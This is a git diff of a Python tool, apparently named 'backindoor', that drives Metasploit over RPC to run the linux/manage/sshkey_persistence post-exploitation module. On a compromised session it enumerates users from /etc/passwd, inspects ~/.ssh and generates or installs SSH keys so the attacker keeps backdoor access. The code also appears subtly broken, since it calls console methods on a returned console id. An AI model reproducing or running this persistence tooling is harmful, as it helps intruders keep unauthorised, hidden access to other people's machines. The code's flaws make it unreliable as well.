@@ -17,7 +17,7 @@ class Msf:
     def __init__(self) -> None:
         # self.client = MsfRpcClient('backindoor', port=55553, ssl=True)
         self.client = MsfRpcClient('backindoor', port=55553, ssl=False)
-        self.console_list = []
+        self.msf_console_list = []
     
 
     def msf_ssh_key(self):
@@ -26,49 +26,59 @@ class Msf:
             module = self.client.modules.use('post', 'linux/manage/sshkey_persistence')
             print(module.description)
             print()
-            in1 = input('MSF Session [1] -> ')
-
-            console = self.create_console()
-            console.write('cut -d: -f1 /etc/passwd')
-            print(console.read())
-            # TODO: GUARDAR LISTA DE USUARIOS CON LA RESPUESTA DE LA CONSOLA
-
-            
-            in2 = input('Username [all] -> ')
-            in3 = input('Public key [all] -> ')
-            # TODO: CREAR CLAVE SSH EN CASO DE QUE NO SE HAYA SELECCIONADO NINGUNA
-            if in3 == '':
-                self.ssh_key_gen()
-            in4 = input('SSHD config [default] -> ')
-            in5 = input('Create SSHD folder [no] -> ')
-            print()
-            if in1 != '':
+            # Listar sesiones existentes al usuario
+            in1 = input('MSF Session [1] -> ').strip()
+            if in1 != '' and in1 in self.client.sessions.list.keys():
                 module['SESSION'] = int(in1)
-            else: module['SESSION'] = int(list(self.client.sessions.list.keys())[0])
-            if in2 != '':
-                module['USERNAME'] = in2
-            if in3 != '':
-                module['PUBKEY'] = in3
-            if in4 != '':
-                module['SSHD_CONFIG'] = in4
-            if in5 != '':
-                module['CREATESSHFOLDER'] = in5
+            else:
+                module['SESSION'] = int(list(self.client.sessions.list.keys())[0])
+                print('WARM: Selected session doesnt exists. Selecting session 1')
 
-            console_id = self.client.consoles.console().cid
-            console = self.client.consoles.console(console_id)
-            print(console.run_module_with_output(module))
-            console.destroy()
+            console = self.create_msf_console()
+            console.write('cut -d: -f1 /etc/passwd')
+            users_list = console.read().split()
+            # TODO: GUARDAR LISTA DE USUARIOS CON LA RESPUESTA DE LA CONSOLA
+            # TODO: EXCLUIR TODOS LOS USUARIOS DE SISTEMA
+
+            in2 = input('Username [all] -> ').strip()
+            if in2 != '' and in2 in users_list:
+                module['USERNAME'] = in2
+
+            in3 = input('Public key [all] -> ').strip()
+            # Buscar claves SSH en directorio por defecto del usuario
+            console.write('ls ${HOME}/.ssh')
+            ssh_keys_list = console.read().split()
+            
+            if in3 != '' and in3 in ssh_keys_list:
+                module['PUBKEY'] = in3
+            else:
+                self.ssh_key_gen()
+
+            in4 = input('SSHD config [default] -> ').strip()
+            if in4 != '':
+                # TODO: COMPROBAR QUE ES UNA RUTA VALIDA
+                module['SSHD_CONFIG'] = in4
+
+            in5 = input('Create SSHD folder [no] -> ').strip()
+            if in5 == 'yes':
+                module['CREATESSHFOLDER'] = 'true'
+            print()
+
+            msf_console_id = self.client.consoles.console().cid
+            msf_console = self.client.consoles.console(msf_console_id)
+            print(msf_console.run_module_with_output(module))
+            msf_console.destroy()
             return module['SESSION']
 
         else:
-            print('-- ERROR: Requiere al menos una sesion MSF activa')
+            print('-- HOT: Requiere al menos una sesion MSF activa')
             return False
             
         # except:
         #     print('-- ERROR: No hay servidor RPC activo')
 
 
-# TODO: COMRPOBRAR FUNCIONAMIENTO GET_CONSOLE(), CREATE_CONSOLE(), SSH_KEY_GEN()
+# TODO: COMRPOBRAR FUNCIONAMIENTO GET_MSF_CONSOLE(), CREATE_MSF_CONSOLE(), SSH_KEY_GEN()
 
     def ssh_key_gen(self):
         # Guardar directorio HOME del usuario
@@ -82,25 +92,25 @@ class Msf:
         with open(home_dir + '/.ssh/bid0_key.pub', 'w') as file:
             file.write(f'{private_key.get_name()} {private_key.get_base64()}')
 
-        print('Clave SSH generada exitosamente.')
+        print('COOL: Clave SSH generada exitosamente.')
 
-    def create_console(self):
-        self.console_list.append(self.client.consoles.console().cid)
-        return self.console_list[-1]
+    def create_msf_console(self):
+        self.msf_console_list.append(self.client.consoles.console().cid)
+        return self.msf_console_list[-1]
     
-    def get_console(self, id_console):
+    def get_msf_console(self, id_console):
         # Si no hay ninguna consola creada, se crea una nueva
-        if len(self.console_list) == 0:
-            return self.create_console()
+        if len(self.msf_console_list) == 0:
+            return self.create_msf_console()
         # Si hay consola creada y existe el parametro id_console, se busca y si no se encuetra, devuelve None
         elif id_console:
-            for console in self.console_list:
+            for console in self.msf_console_list:
                 if id_console == console.id:
                     return console
             return None
         # Si no recibe el parametro id_console, devuelve la lista de consolas
         else:
-            return self.console_list
+            return self.msf_console_list
             
 
 
